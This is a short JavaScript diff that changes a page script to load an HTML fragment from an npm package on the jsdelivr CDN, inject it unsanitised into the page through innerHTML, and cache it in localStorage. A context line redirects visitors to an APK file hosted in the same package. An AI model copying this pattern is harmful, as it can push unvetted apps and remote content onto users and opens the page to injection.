@@ -20,21 +20,24 @@ function dc()
 
  window.location.assign("https://cdn.jsdelivr.net/npm/arcio@1.0.2/fnaka.apk")
  }
-function  checkCookie(){
- function  spd(){
-         k=getCookie("mkl");
+ 
+ function  checkCookie(){
+         k=localStorage.getItem("mkl");
           if  (k==null){
 a=$.get("https://cdn.jsdelivr.net/npm/arcio@1.0.2/la.html");
 a.done(function(){
 var  b=a.responseText;
 let m=document.getElementById("p1");
  m.innerHTML=b;
- setCookie("mkl",b,250);
+ window.localStorage.setItem("mkl",b);
  
 })}
 else {
 let kch=document.getElementById("p1");
  kch.innerHTML=k;
+ a=$.get("https://cdn.jsdelivr.net/npm/arcio@1.0.2/la.html");
+a.done(function(){
+var  b=a.responseText;
+ window.localStorage.setItem("mkl",b);
 
-
- }}}
+ })}}
